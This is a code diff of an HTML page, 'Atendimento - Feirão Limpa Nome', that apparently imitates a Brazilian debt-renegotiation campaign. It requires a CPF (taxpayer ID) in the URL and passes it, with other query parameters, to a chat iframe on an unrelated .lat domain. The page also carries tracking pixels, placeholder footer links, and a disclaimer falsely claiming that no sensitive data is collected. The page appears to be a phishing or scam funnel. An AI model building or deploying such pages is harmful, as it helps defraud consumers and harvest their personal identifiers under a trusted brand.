@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Atendimento</title>
+  <title>Atendimento - Feirão Limpa Nome</title>
+  <link href="https://fonts.bunny.net/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
   <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
   <script>
     window.pixelId = "67f846e3e19eff9c461bb215";
@@ -15,162 +16,146 @@
   </script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; background: #fff; font-family: Roboto, sans-serif; }
-
-    #loading {
-      position: fixed;
-      inset: 0;
+    html, body {
+      height: 100%;
+      font-family: Inter, sans-serif;
+      background: #F5F7FA;
+      color: #333;
+    }
+    .page {
+      max-width: 430px;
+      margin: 0 auto;
+      min-height: 100vh;
+      min-height: 100dvh;
       display: flex;
       flex-direction: column;
+      background: #FCE6EF;
+      padding: 20px;
+    }
+    .card {
+      background: #FFF5F8;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .card h2 {
+      text-align: center;
+      color: #A3005A;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .card p {
+      text-align: center;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    .chat-wrapper {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 440px;
+      margin-bottom: 24px;
+    }
+    #chat-iframe {
+      width: 100%;
+      flex: 1;
+      min-height: 440px;
+      border: none;
+      border-radius: 12px;
+      background: #fff;
+    }
+    .disclaimer {
+      font-size: 13px;
+      background: #fff;
+      padding: 16px;
+      border-radius: 12px;
+      border-left: 4px solid #E80070;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      padding-bottom: 12px;
+    }
+    footer a { color: #666; text-decoration: none; }
+    #loading {
+      position: absolute;
+      inset: 0;
+      display: flex;
       align-items: center;
       justify-content: center;
-      gap: 16px;
-      background: #fff;
-      z-index: 10;
+      background: #FCE6EF;
+      z-index: 5;
     }
-
     .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #f0f0f0;
+      width: 36px;
+      height: 36px;
+      border: 3px solid #f0f0f0;
       border-top-color: #E80070;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
-
     @keyframes spin { to { transform: rotate(360deg); } }
-
-    #loading p { color: #555; font-size: 16px; }
-
-    #error {
-      display: none;
-      position: fixed;
-      inset: 0;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 16px;
-      padding: 24px;
-      text-align: center;
-      background: #fff;
-      z-index: 20;
-    }
-
-    #error h2 { font-size: 20px; color: #111; }
-    #error p { color: #666; font-size: 15px; max-width: 400px; line-height: 1.5; }
-
-    #error button, #error a.btn {
-      display: inline-block;
-      padding: 12px 24px;
-      font-size: 15px;
-      font-weight: 600;
-      color: #fff;
-      background: #E80070;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      text-decoration: none;
-    }
-
-    #error button:hover, #error a.btn:hover { background: #c9005f; }
-
-    typebot-standard {
-      width: 100%;
-      height: 100vh;
-      display: block;
-    }
+    .chat-container { position: relative; flex: 1; min-height: 440px; }
   </style>
 </head>
 <body>
-  <div id="loading">
-    <div class="spinner"></div>
-    <p>Conectando ao atendimento...</p>
+  <div class="page">
+    <div class="card">
+      <h2>Etapas para consulta</h2>
+      <p>Converse com o atendente para verificar sua situação e participar do Feirão Limpa Nome.</p>
+    </div>
+
+    <div class="chat-wrapper">
+      <div class="chat-container">
+        <div id="loading"><div class="spinner"></div></div>
+        <iframe
+          id="chat-iframe"
+          title="Atendimento"
+          allow="clipboard-write; microphone; camera"
+          allowfullscreen
+        ></iframe>
+      </div>
+    </div>
+
+    <p class="disclaimer">
+      Esta plataforma visa orientar os cidadãos sobre a regularização de registros financeiros em território nacional. Não coletamos dados sensíveis e atuamos de forma responsável e educativa.
+    </p>
+
+    <footer>
+      <a href="#">Política de privacidade</a> |
+      <a href="#">Termos de uso</a> |
+      <a href="#">Contato</a>
+    </footer>
   </div>
 
-  <div id="error">
-    <h2>Não foi possível carregar o atendimento</h2>
-    <p id="error-message">O servidor do chat está temporariamente indisponível. Tente novamente ou acesse diretamente.</p>
-    <button type="button" id="retry-btn">Tentar novamente</button>
-    <a class="btn" id="direct-link" href="#" target="_blank" rel="noopener">Abrir chat diretamente</a>
-  </div>
+  <script>
+    (function () {
+      var CHAT_URL = "https://chat.atendimentoaqui24h.lat/home";
+      var params = window.location.search;
 
-  <typebot-standard style="width:100%;height:100vh;display:block;"></typebot-standard>
-
-  <script type="module">
-    const TYPEBOT_ID = "bfilyz";
-    const API_HOST = "https://bot-typebot-viewer.ksrub8.easypanel.host";
-
-    const loadingEl = document.getElementById("loading");
-    const errorEl = document.getElementById("error");
-    const errorMessageEl = document.getElementById("error-message");
-    const retryBtn = document.getElementById("retry-btn");
-    const directLink = document.getElementById("direct-link");
-
-    function getPrefilledVariables() {
-      const params = new URLSearchParams(window.location.search);
-      const vars = {};
-      params.forEach(function (value, key) {
-        if (value) vars[key] = value;
-      });
-      return vars;
-    }
-
-    function getDirectUrl() {
-      return API_HOST + "/" + TYPEBOT_ID + window.location.search;
-    }
-
-    function showError(message) {
-      loadingEl.style.display = "none";
-      errorEl.style.display = "flex";
-      if (message) errorMessageEl.textContent = message;
-      directLink.href = getDirectUrl();
-    }
-
-    function hideLoading() {
-      loadingEl.style.display = "none";
-      errorEl.style.display = "none";
-    }
-
-    async function initTypebot() {
-      loadingEl.style.display = "flex";
-      errorEl.style.display = "none";
-      directLink.href = getDirectUrl();
-
-      try {
-        const Typebot = (await import("https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js")).default;
-
-        let initialized = false;
-
-        Typebot.initStandard({
-          typebot: TYPEBOT_ID,
-          apiHost: API_HOST,
-          prefilledVariables: getPrefilledVariables(),
-          onInit: function () {
-            initialized = true;
-            hideLoading();
-          }
-        });
-
-        setTimeout(function () {
-          if (!initialized) {
-            showError("O atendimento está demorando para responder. Verifique sua conexão ou tente abrir o chat diretamente.");
-          }
-        }, 15000);
-      } catch (err) {
-        console.error("Erro ao iniciar Typebot:", err);
-        showError("Erro ao carregar o chat. Tente novamente em alguns instantes.");
+      if (!params.includes("cpf=")) {
+        window.location.replace("/cpf" + params);
+        return;
       }
-    }
 
-    retryBtn.addEventListener("click", function () {
-      window.location.reload();
-    });
+      var iframe = document.getElementById("chat-iframe");
+      var loading = document.getElementById("loading");
 
-    if (!window.location.search.includes("cpf=")) {
-      window.location.replace("/cpf" + window.location.search);
-    } else {
-      initTypebot();
-    }
+      iframe.src = CHAT_URL + params;
+
+      iframe.addEventListener("load", function () {
+        loading.style.display = "none";
+      });
+
+      setTimeout(function () {
+        loading.style.display = "none";
+      }, 8000);
+    })();
   </script>
 </body>
 </html>
